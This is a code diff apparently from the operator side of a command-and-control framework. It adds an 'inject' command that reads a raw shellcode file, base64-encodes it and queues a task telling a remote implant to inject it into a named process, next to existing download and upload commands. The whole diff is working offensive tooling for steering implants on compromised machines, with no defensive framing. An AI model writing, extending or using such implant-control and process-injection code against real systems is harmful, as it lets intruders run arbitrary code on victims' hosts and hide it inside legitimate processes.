@@ -70,6 +70,8 @@ def handle(cmd: str, args: List[str], config: OperatorConfig, implant_id: str) -
         handle_download(config, implant_id, args)
     elif cmd == "upload":
         handle_upload(config, implant_id, args)
+    elif cmd == "inject":
+        handle_inject(config, implant_id, args)
     elif cmd == "back":
         return True
     elif cmd == "clear":
@@ -296,3 +298,27 @@ def handle_upload(config: OperatorConfig, implant_id: str, args: List[str]) -> N
 
     logger.debug(f"Sending upload task to {implant_id}")
     add_task(config, Opcodes.UPLOAD.value, implant_id, [remote_path, file_contents])
+
+def handle_inject(config: OperatorConfig, implant_id: str, args: List[str]) -> None:
+    """
+    Handle the inject command, send an inject task to the implant
+    """
+    if len(args) < 2:
+        logger.error("Please provide a file path and a process name to inject")
+        return
+
+    logger.warning(f"Injecting raw shellcode can be unstable. Use at your own risk.")
+
+    file_path = args[0]
+    process_name = args[1]
+    
+    if not os.path.isfile(file_path):
+        logger.error(f"File {file_path} does not exist")
+        return
+
+    # Read file bytes
+    with open(file_path, "rb") as f:
+        file_contents = base64.b64encode(f.read()).decode()
+
+    logger.debug(f"Sending inject task to {implant_id}")
+    add_task(config, Opcodes.INJECT.value, implant_id, [file_contents, process_name])
